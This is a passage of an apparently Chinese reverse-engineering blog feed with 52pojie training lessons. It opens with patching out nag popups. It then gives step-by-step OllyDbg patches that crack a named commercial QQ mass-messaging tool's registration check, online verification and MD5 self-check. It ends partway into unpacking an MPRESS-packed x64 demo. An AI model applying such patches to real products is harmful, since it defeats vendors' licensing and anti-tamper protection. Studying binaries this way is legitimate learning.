第一次弹窗</span><br></pre></td></tr></table></figure><p>继续单步，<code>004010C4</code>就是第一次弹窗的位置，所以将这两个call指令nop掉即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004010A9  |.  83C4 04       add esp,0x4</span><br><span class="line">004010AC  |&gt;  E8 13000000   call 第二课.004010C4                        ;  第一次弹窗</span><br><span class="line">004010B1  |.  E8 C3000000   call 第二课.00401179</span><br><span class="line">004010B6  |.  E8 C5000000   call 第二课.00401180                        ;  第二次弹窗</span><br><span class="line">004010BB  |.  E8 75010000   call 第二课.00401235</span><br></pre></td></tr></table></figure><p>这次它说暗桩没有触发。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;NO.1~NO.3在&lt;a href=&quot;https://v5le0n9.github.io/posts/e2d652c5.html&quot;&gt;第一课——脱壳基础&lt;/a&gt;就已经实践完了，所以这个笔记从NO.4开始。这个笔记是在&lt;a href=&quot;https://v5le0n9.github.io/posts/33a085c7.html&quot;&gt;调试器使用教程&lt;/a&gt;的基础上讲解，所以一定要保证自己已经了解OD的基本操作才推荐看这个笔记，但绝对会比论坛的大牛们讲解的详细。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第四课——去程序自校验</title>
    <link href="http://example.com/posts/65ab04eb.html"/>
    <id>http://example.com/posts/65ab04eb.html</id>
    <published>2022-04-05T01:29:28.172Z</published>
    <updated>2022-04-11T05:26:04.936Z</updated>
    
    <content type="html"><![CDATA[<p>破解豪迪群发器。</p><p>打开注册页面，随便输入注册码，会出现以下：</p><span id="more"></span><img src="/posts/65ab04eb/%E8%B1%AA%E8%BF%AA%E6%B3%A8%E5%86%8C.jpg" class="" title="豪迪注册"><p>程序无壳，直接破解。右键-&gt;中文搜索引擎-&gt;智能搜索。找到“已注册版本”，应该是主页页面中央的红字部分。点进去，发现上面有比较和跳转指令。在跳转指令处下断，运行程序，点击注册，发现程序停在断点处，说明找对地方了。这个对比语句比较的是<code>0x579F24</code>这个所指向的全局变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00541870  |.  803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br><span class="line">00541877  |.  74 10         je short qqqf.00541889</span><br><span class="line">00541879  |.  BA F4185400   mov edx,qqqf.005418F4                    ;  已注册版本</span><br></pre></td></tr></table></figure><p>右键-&gt;查找-&gt;所有常量，输入<code>0x579F24</code>。OD跳到所有调用过<code>0x579F24</code>的指令，右键-&gt;在每个命令上设置断点。快速定位第一个赋值点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">参考位于 qqqf:CODE 到常量 0x579F24</span><br><span class="line">地址       反汇编                                    注释</span><br><span class="line">0054135F   mov byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">00541366   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">0054147C   mov byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">00541650   mov byte ptr ds:[0x579F24],dl</span><br><span class="line">0054169E   mov byte ptr ds:[0x579F24],al</span><br><span class="line">005416A3   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">00541870   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">0056AFB0   push ebp                                  (初始 CPU 选择)</span><br></pre></td></tr></table></figure><p>重载，去到第一个断点处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0054163B   .  E8 842FECFF   call qqqf.004045C4</span><br><span class="line">00541640   .  83F8 18       cmp eax,0x18</span><br><span class="line">00541643   .  74 09         je short qqqf.0054164E;eax=0x18则给dl赋值为1</span><br><span class="line">00541645   .  83F8 0C       cmp eax,0xC</span><br><span class="line">00541648   .  74 04         je short qqqf.0054164E;eax=0xC也可以给dl赋值为1</span><br><span class="line">0054164A   .  33D2          xor edx,edx;eax不等于0x18或0xc则给dl赋值为0</span><br><span class="line">0054164C   .  EB 02         jmp short qqqf.00541650</span><br><span class="line">0054164E   &gt;  B2 01         mov dl,0x1</span><br><span class="line">00541650   &gt;  8815 249F5700 mov byte ptr ds:[0x579F24],dl;第一个断点处，将dl的值赋给它</span><br><span class="line">00541656   .  83F8 0C       cmp eax,0xC</span><br><span class="line">00541659   .  75 48         jnz short qqqf.005416A3;如果eax不等于0xC则跳转</span><br></pre></td></tr></table></figure><p>首先假设eax=0x18(在注册页面上输入0x18位注册码)的情况，即最后一个跳转指令要跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">005416A3   &gt; \803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br><span class="line">005416AA   .  75 05         jnz short qqqf.005416B1;跳转实现</span><br></pre></td></tr></table></figure><p>Shift+F9运行，去到第二个断点处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0054135A  |.  83F8 0C       cmp eax,0xC</span><br><span class="line">0054135D  |.  74 07         je short qqqf.00541366;eax=0xC跳转，否则会执行赋0语句</span><br><span class="line">0054135F  |.  C605 249F5700&gt;mov byte ptr ds:[0x579F24],0x0</span><br><span class="line">00541366  |&gt;  803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br></pre></td></tr></table></figure><p>Shift+F9运行，继续去到第三个断点处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00541870  |.  803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br><span class="line">00541877  |.  74 10         je short qqqf.00541889;eax=0x18时会执行赋0语句，所以会跳过“已注册版本”</span><br><span class="line">00541879  |.  BA F4185400   mov edx,qqqf.005418F4                    ;  已注册版本</span><br><span class="line">0054187E  |.  8B83 FC020000 mov eax,dword ptr ds:[ebx+0x2FC]</span><br><span class="line">00541884  |.  E8 F77CFBFF   call qqqf.004F9580</span><br><span class="line">00541889  |&gt;  33C0          xor eax,eax</span><br></pre></td></tr></table></figure><p>重载OD，在注册页面上输入0xC位注册码，运行。第一个断点没问题，去到第二个断点处(此时这第二个断点与上次输入0x18的第二个断点已经不一样了)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00541696   . /7F 04                 jg short qqqf.0054169C</span><br><span class="line">00541698   &gt; |33C0                  xor eax,eax</span><br><span class="line">0054169A   . |EB 02                 jmp short qqqf.0054169E</span><br><span class="line">0054169C   &gt; \B0 01                 mov al,0x1</span><br><span class="line">0054169E      A2 249F5700           mov byte ptr ds:[0x579F24],al;此时al的值为0</span><br><span class="line">005416A3      803D 249F5700 00      cmp byte ptr ds:[0x579F24],0x0</span><br><span class="line">005416AA      75 05                 jnz short qqqf.005416B1;这里一定让它跳转，否则注册失败</span><br></pre></td></tr></table></figure><p>修改第一行的跳转指令，使al为1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jg short qqqf.0054169C=&gt;jmp short qqqf.0054169C</span><br></pre></td></tr></table></figure><p>保存一下，载入新程序再下断运行，发现运行到<code>54169E</code>时al还是为0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0054168C     /75 0A         jnz short qqqf1.00541698</span><br><span class="line">0054168E   . |8B07          mov eax,dword ptr ds:[edi]</span><br><span class="line">00541690   . |E8 177EFCFF   call qqqf1.005094AC</span><br><span class="line">00541695   . |40            inc eax</span><br><span class="line">00541696   . |EB 04         jmp short qqqf1.0054169C;修改过</span><br><span class="line">00541698   &gt; \33C0          xor eax,eax</span><br><span class="line">0054169A   .  EB 02         jmp short qqqf1.0054169E</span><br><span class="line">0054169C   &gt;  B0 01         mov al,0x1</span><br><span class="line">0054169E   &gt;  A2 249F5700   mov byte ptr ds:[0x579F24],al</span><br><span class="line">005416A3   &gt;  803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br></pre></td></tr></table></figure><p>猜测<code>54168C</code>的跳转指令绕过了我们刚才修改过的指令，再<code>54168C</code>处下断，重载，运行到这里果然跳转实现了。那将<code>54168C</code>改为nop，让它执行<code>541696</code>使al为1。</p><p>保存，运行一下，发现左下角显示“已注册！”，接着显示“正在验证…”，“验证失败！”。</p><img src="/posts/65ab04eb/%E9%AA%8C%E8%AF%81.jpg" class="" title="验证失败"><p>载入OD，查找字符串“验证失败！”处，查看上下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00540B2A  |&gt; \807D EB 00    cmp byte ptr ss:[ebp-0x15],0x0</span><br><span class="line">00540B2E  |.  75 68         jnz short qqqf2.00540B98</span><br><span class="line">00540B30  |.  B8 E00E5400   mov eax,qqqf2.00540EE0                   ;  验证失败！</span><br><span class="line">00540B35  |.  E8 3ED00100   call qqqf2.0055DB78</span><br></pre></td></tr></table></figure><p>尝试将跳转指令修改一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnz short qqqf2.00540B98=&gt;jmp short qqqf2.00540B98</span><br></pre></td></tr></table></figure><p>F9运行发现经过验证后显示“已注册！”字样，说明验证成功。而且点击注册那里也显示“已注册版本”。</p><p>由于每次等待验证的时间都非常长，所以也可以直接在函数段首<code>retn</code>，绕过验证过程。</p><p>当运用“插入文件”、“插入其他”、“插入图片”功能时，都显示乱码。反正就是很多功能都不能用。</p><img src="/posts/65ab04eb/%E6%8F%92%E5%85%A5%E5%85%B6%E4%BB%96.jpg" class="" title="插入其他"><p>这就涉及到程序自校验的问题。这个程序是什么类型的自校验呢？将原程序拉进WinHEX，在程序末尾填充00的任意一个地方修改为01保存，使用以上功能时还是乱码，很有可能是MD5自校验。</p><p>从 <a href="https://www.52pojie.cn/thread-14986-1-1.html">https://www.52pojie.cn/thread-14986-1-1.html</a> 下载脱壳脚本。将已注册版本的程序载入OD，插件-&gt;ODbgScript-&gt;打开，选择脱壳脚本里的各语言按钮事件-&gt;Delphi &amp; VB事件断点查找脚本。可以在<code>B</code>模块看到自动下了很多断点。Shift+F9运行起来，在程序界面点击“插入其他”，OD停在某断点处。因为还没有显示下拉菜单，更别提是自校验的过程了，所以这个断点可以去掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00479DF4  |.  FF93 20010000 call dword ptr ds:[ebx+0x120]            ;  qqqf3_1.0056934C</span><br></pre></td></tr></table></figure><p>F9运行，在程序界面点击插入其他-&gt;插入随机字母，OD停在下个断点处。这个函数才是触发自校验过程的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0048B2D6   .  FF93 88000000 call dword ptr ds:[ebx+0x88]             ;  qqqf3_1.00567ED8</span><br></pre></td></tr></table></figure><p>F7跟进去。这个函数里也有挺多个call指令，到底哪个是MD5自校验函数呢？我们知道，MD5自校验需要读取文件来计算MD5值，所以如果在call里面看到有关文件的API函数，很大可能这个函数是MD5自校验的关键函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">00567ED8  /.  55            push ebp</span><br><span class="line">00567ED9  |.  8BEC          mov ebp,esp</span><br><span class="line">00567EDB  |.  6A 00         push 0x0</span><br><span class="line">00567EDD  |.  6A 00         push 0x0</span><br><span class="line">00567EDF  |.  33C0          xor eax,eax</span><br><span class="line">00567EE1  |.  55            push ebp</span><br><span class="line">00567EE2  |.  68 347F5600   push qqqf3_1.00567F34</span><br><span class="line">00567EE7  |.  64:FF30       push dword ptr fs:[eax]</span><br><span class="line">00567EEA  |.  64:8920       mov dword ptr fs:[eax],esp</span><br><span class="line">00567EED  |.  8D4D F8       lea ecx,[local.2]</span><br><span class="line">00567EF0  |.  33D2          xor edx,edx</span><br><span class="line">00567EF2  |.  B8 1E000000   mov eax,0x1E</span><br><span class="line">00567EF7  |.  E8 C4AEF4FF   call qqqf3_1.004B2DC0</span><br><span class="line">00567EFC  |.  8B55 F8       mov edx,[local.2]</span><br><span class="line">00567EFF  |.  8D45 FC       lea eax,[local.1]</span><br><span class="line">00567F02  |.  E8 D1CCE9FF   call qqqf3_1.00404BD8</span><br><span class="line">00567F07  |.  8B45 FC       mov eax,[local.1]</span><br><span class="line">00567F0A  |.  50            push eax</span><br><span class="line">00567F0B  |.  E8 5049FFFF   call qqqf3_1.0055C860</span><br><span class="line">00567F10  |.  5A            pop edx                                  ;  qqqf3_1.0048B2DC</span><br><span class="line">00567F11  |.  E8 9AF9F8FF   call qqqf3_1.004F78B0</span><br><span class="line">00567F16  |.  33C0          xor eax,eax</span><br><span class="line">00567F18  |.  5A            pop edx                                  ;  qqqf3_1.0048B2DC</span><br><span class="line">00567F19  |.  59            pop ecx                                  ;  qqqf3_1.0048B2DC</span><br><span class="line">00567F1A  |.  59            pop ecx                                  ;  qqqf3_1.0048B2DC</span><br><span class="line">00567F1B  |.  64:8910       mov dword ptr fs:[eax],edx</span><br><span class="line">00567F1E  |.  68 3B7F5600   push qqqf3_1.00567F3B</span><br><span class="line">00567F23  |&gt;  8D45 F8       lea eax,[local.2]</span><br><span class="line">00567F26  |.  E8 ADC3E9FF   call qqqf3_1.004042D8</span><br><span class="line">00567F2B  |.  8D45 FC       lea eax,[local.1]</span><br><span class="line">00567F2E  |.  E8 DDCAE9FF   call qqqf3_1.00404A10</span><br><span class="line">00567F33  \.  C3            retn</span><br></pre></td></tr></table></figure><p>一个一个点击回车跟随call指令进去看看，后面的那几个call要不就是没有call指令要不就是无关文件的API函数，都可以不管。<code>00567EF7</code>地址的call指令，进去的第二个call的第一个call，看到<code>GetModuleFileNameA</code>函数，所以<code>00567EF7</code>的函数调用是自校验的关键函数。在<code>GetModuleFileNameA</code>函数下断运行。<code>GetModuleFileNameA</code>函数的意思是获取当前进程已加载模块的完整路径，该模块必须由当前进程加载。</p><p>继续F8单步，运行到此处时，可以看到eax显示<code>C:\Program Files\QQSendFriend\Desklog.dll</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004B2E1A  |.  E8 856FF5FF   call qqqf3_1.00409DA4</span><br></pre></td></tr></table></figure><p>F7跟进去，发现这个函数是用来创建<code>Desklog.dll</code>文件的。再看下个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004B2E27  |.  E8 14E2FFFF   call qqqf3_1.004B1040</span><br></pre></td></tr></table></figure><p>跟进去，第一个call指令里有个<code>SetFilePointer</code>函数，在一个文件中设置新的读取位置。第二个call指令里有个<code>ReadFile</code>函数。第三个又是<code>SetFilePointer</code>函数，跳出循环，第四个又是<code>ReadFile</code>函数等等。但运行完整个<code>4B1040</code>函数程序都没有返回火星文。那继续往下看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">004B2E27  |.  E8 14E2FFFF   call qqqf3_1.004B1040</span><br><span class="line">004B2E2C  |.  8BC7          mov eax,edi</span><br><span class="line">004B2E2E  |.  E8 9170F5FF   call qqqf3_1.00409EC4;关闭句柄</span><br><span class="line">004B2E33  |.  8D55 F0       lea edx,[local.4]</span><br><span class="line">004B2E36  |.  33C0          xor eax,eax</span><br><span class="line">004B2E38  |.  E8 2FFCF4FF   call qqqf3_1.00402A6C;又是GetMouduleFileNameA</span><br><span class="line">004B2E3D  |.  8B45 F0       mov eax,[local.4]</span><br><span class="line">004B2E40  |.  8D55 F8       lea edx,[local.2]</span><br><span class="line">004B2E43  |.  E8 ECF0FFFF   call qqqf3_1.004B1F34;跟进去</span><br></pre></td></tr></table></figure><p>在<code>004B1F34</code>这个函数的第三个call语句<code>4B1DD8</code>函数发现<code>CreateFile</code>函数，是一个多功能的函数，可打开或创建文件或者I/O设备。继续F8，还看到了一个<code>GetFileSize</code>函数用来获取文件大小。获取文件大小后的那个函数就是MD5校验算法，我们暂时没那个能力对算法进行跟踪，所以先暂时互相放过彼此。</p><p>继续F8返回到<code>4B1DD8</code>处，F8去到<code>4B1F74</code>处，信息窗口显示堆栈地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">004B1F6A  |.  E8 69FEFFFF   call qqqf3_1.004B1DD8</span><br><span class="line">004B1F6F  |.  BE 10000000   mov esi,0x10</span><br><span class="line">004B1F74  |.  8D5D EC       lea ebx,[local.5]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">堆栈地址=0012FCD8</span><br><span class="line">ebx=0012FD54</span><br></pre></td></tr></table></figure><p>数据窗口跟随，<code>0012FCD8</code>一行显示的就是当前程序的MD5值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0012FCD8  52 8C 2A 4F CB 43 39 6F 2D 6F 7A 91 FE C0 CF DC  R?O薈9o-oz扊老</span><br></pre></td></tr></table></figure><p>而原程序的MD5值为11ea70a3c3735c29b48552776756406a。可以把当前程序拖去WinMD5检验是否为上面的MD5值528C2A4FCB43396F2D6F7A91FEC0CFDC。</p><p>选中<code>lea ebx,[local.5]</code>右键 -&gt; 分析 -&gt; 从模块中删除分析。将下面代码复制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">004B1F74    8D5D EC         lea ebx,dword ptr ss:[ebp-0x14]</span><br><span class="line">004B1F77    8D55 E8         lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004B1F7A    33C0            xor eax,eax</span><br><span class="line">004B1F7C    8A03            mov al,byte ptr ds:[ebx]</span><br><span class="line">004B1F7E    E8 35F1FFFF     call qqqf3_1.004B10B8</span><br><span class="line">004B1F83    8B55 E8         mov edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004B1F86    8BC7            mov eax,edi</span><br><span class="line">004B1F88    E8 3F26F5FF     call qqqf3_1.004045CC</span><br><span class="line">004B1F8D    43              inc ebx</span><br><span class="line">004B1F8E    4E              dec esi</span><br><span class="line">004B1F8F  ^ 75 E6           jnz short qqqf3_1.004B1F77</span><br></pre></td></tr></table></figure><p>在程序中找一段空代码，比如从<code>0056B0A0</code>开始。在<code>4B1F74</code>修改代码<code>jmp 0056B0A0</code>，将已经复制的代码都NOP掉。F8跳下去，将上面的第1行代码修改成<code>mov dword ptr ss:[ebp-0x14],1</code>放到<code>0056B0A0</code>。将原程序的MD5值二进制粘贴到数据窗口覆盖当前程序的MD5。</p><p>修改第1行代码为<code>mov dword ptr ss:[ebp-0x14],0xA370EA11</code>。继续编写第2到4行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr ss:[ebp-0x10],0x295c73c3</span><br><span class="line">mov dword ptr ss:[ebp-0xC],0x775285b4</span><br><span class="line">mov dword ptr ss:[ebp-0x8],0x6a405667</span><br></pre></td></tr></table></figure><p>再将上面的二进制代码复制下来，确保一一对应，成品如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0056B0A0    C745 EC 11EA70A3        mov dword ptr ss:[ebp-0x14],0xA370EA11</span><br><span class="line">0056B0A7    C745 F0 C3735C29        mov dword ptr ss:[ebp-0x10],0x295C73C3</span><br><span class="line">0056B0AE    C745 F4 B4855277        mov dword ptr ss:[ebp-0xC],0x775285B4</span><br><span class="line">0056B0B5    C745 F8 6756406A        mov dword ptr ss:[ebp-0x8],0x6A405667</span><br><span class="line">0056B0BC    8D5D EC                 lea ebx,dword ptr ss:[ebp-0x14]</span><br><span class="line">0056B0BF    8D55 E8                 lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">0056B0C2    33C0                    xor eax,eax</span><br><span class="line">0056B0C4    8A03                    mov al,byte ptr ds:[ebx]</span><br><span class="line">0056B0C6    E8 ED5FF4FF             call qqqf3_1.004B10B8</span><br><span class="line">0056B0CB    8B55 E8                 mov edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">0056B0CE    8BC7                    mov eax,edi</span><br><span class="line">0056B0D0    E8 F794E9FF             call qqqf3_1.004045CC</span><br><span class="line">0056B0D5    43                      inc ebx</span><br><span class="line">0056B0D6    4E                      dec esi</span><br><span class="line">0056B0D7  ^ 75 E6                   jnz short qqqf3_1.0056B0BF</span><br><span class="line">0056B0D9  ^ E9 B36EF4FF             jmp qqqf3_1.004B1F91</span><br></pre></td></tr></table></figure><p>F9运行，程序成功看到不是显示火星文，说明破解自校验成功。</p><p>右键 -&gt; 复制到可执行文件 -&gt; 所有修改 -&gt; 复制，保存文件。注意，有时候会出现“无法定位数据”的情况，这时就要改变空代码的位置。最好不要选程序最底端那段代码，经常不行…靠近汇编代码结束处距离5行左右最佳。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;破解豪迪群发器。&lt;/p&gt;
&lt;p&gt;打开注册页面，随便输入注册码，会出现以下：&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第十课——x64平台脱壳与破解实战</title>
    <link href="http://example.com/posts/efe98763.html"/>
    <id>http://example.com/posts/efe98763.html</id>
    <published>2022-04-05T01:29:28.152Z</published>
    <updated>2022-04-11T05:26:01.291Z</updated>
    
    <content type="html"><![CDATA[<p>由于吾爱虚拟机是32位的，运行不了64位程序，所以这节课用物理机来操作。</p><h1 id="1-课程例子"><a href="#1-课程例子" class="headerlink" title="1. 课程例子"></a>1. 课程例子</h1><p>拿到程序，先运行一下熟悉流程，再查壳，发现有MPRESS壳(压缩壳)。压缩壳在壳段开始的时候做的第一件事往往是<code>pushad</code>(保存寄存器)，在壳段结束的时候做的最后一件事是<code>popad</code>(还原寄存器)，所以我们可以用ESP定律脱压缩壳。但在64位的程序下，一般不会这么做。</p><span id="more"></span><img src="/posts/efe98763/%E6%9F%A5%E5%A3%B3.png" class="" title="查壳"><p>将程序载入x64dbg，F9运行，去到标准的MPRESS的入口地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">000000014001B0C0 | 57                       | push rdi                                |</span><br><span class="line">000000014001B0C1 | 56                       | push rsi                                |</span><br><span class="line">000000014001B0C2 | 53                       | push rbx                                |</span><br><span class="line">000000014001B0C3 | 51                       | push rcx                                |</span><br><span class="line">000000014001B0C4 | 52                       | push rdx                                | rdx:EntryPoint</span><br><span class="line">000000014001B0C5 | 41:50                    | push r8                                |</span><br></pre></td></tr></table></figure><p>既然有push，那肯定也有pop，找到下面这几句指令，也就找到出口了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop r8</span><br><span class="line">pop rdx</span><br><span class="line">pop rcx</span><br><span class="line">pop rbx</span><br><span class="line">pop rsi</span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure><p>但现在找不到，因为MPRESS把壳段跳到OEP的那部分代码给压缩了，要等它解压到那部分代码才能找到。</p><p>暂时先不管，单步跟踪试一下，到达一个跨区段的跳转<code>14001BBA7</code>。下面是空代码，上面有pop指令(但不是pop上面那几句)，很像UPX。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">000000014001BB9A | 41:5F                    | pop r15                                 |</span><br><span class="line">000000014001BB9C | 41:5E                    | pop r14                                 |</span><br><span class="line">000000014001BB9E | 41:5D                    | pop r13                                 |</span><br><span class="line">000000014001BBA0 | 41:5C                    | pop r12                                 |</span><br><span class="line">000000014001BBA2 | 5F                       | pop rdi                                 |</span><br><span class="line">000000014001BBA3 | 5E                       | pop rsi                                 |</span><br><span class="line">000000014001BBA4 | 5D                       | pop rbp                                 |</span><br><span class="line">000000014001BBA5 | 5B                       | pop rbx                                 |</span><br><span class="line">000000014001BBA6 | C3                       | ret                                     |</span><br><span class="line">000000014001BBA7 | E9 1F00FFFF              | jmp demo.14000BBCB                      |</span><br><span class="line">000000014001BBAC | 54                       | push rsp                                |</span><br><span class="line">000000014001BBAD | 54                       | push rsp                                |</span><br><span class="line">000000014001BBAE | FE                       | ???                                     |</span><br><span class="line">000000014001BBAF | FF                       | ???                                     |</span><br><span class="line">000000014001BBB0 | FF                       | ???                                     |</span><br><span class="line">000000014001BBB1 | FF                       | ???                                     |</span><br><span class="line">000000014001BBB2 | FF                       | ???                                     |</span><br><span class="line">000000014001BBB3 | FF00                     | inc dword ptr ds:[rax]                  |</span><br><span class="line">000000014001BBB5 | 0000                     | add byte ptr ds:[rax],al                |</span><br><span class="line">000000014001BBB7 | 004D 73                  | add byte ptr ss:[rbp+73],cl             |</span><br><span class="line">000000014001BBBA | 0000                     | add byte ptr ds:[rax],al                |</span><br><span class="line">000000014001BBBC | 0000                     | add byte ptr ds:[rax],al                |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 5F 41 5E 41 